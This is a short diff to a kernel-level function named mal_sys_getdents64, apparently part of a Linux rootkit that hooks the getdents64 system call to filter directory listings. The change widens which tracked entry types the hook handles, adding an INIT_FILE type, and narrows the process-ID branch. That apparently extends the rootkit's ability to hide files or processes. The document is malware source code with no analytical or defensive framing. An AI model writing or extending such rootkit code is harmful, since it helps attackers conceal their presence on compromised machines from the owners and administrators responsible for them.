@@ -157,7 +157,7 @@ asmlinkage long mal_sys_getdents64(const struct pt_regs * regs)
         bool is_proc = false;
 		int dir_type = 0;
         while (tmp) {
-                if (tmp->fd == fd && tmp->pid == pid && (tmp->type == BASE_PROC)) {
+                if (tmp->fd == fd && tmp->pid == pid && (tmp->type == BASE_PROC || tmp->type == INIT_FILE)) {
                         is_proc = true;
 						dir_type = tmp->type;
                         break;
@@ -199,7 +199,7 @@ asmlinkage long mal_sys_getdents64(const struct pt_regs * regs)
                                 continue;
 						}
 
-                        if (is_proc) {
+                        if (is_proc && (dir_type == BASE_PROC)) {
 								long file_pid = 0;
 								kstrtol(dpt->d_name+1, 10, &file_pid);
 
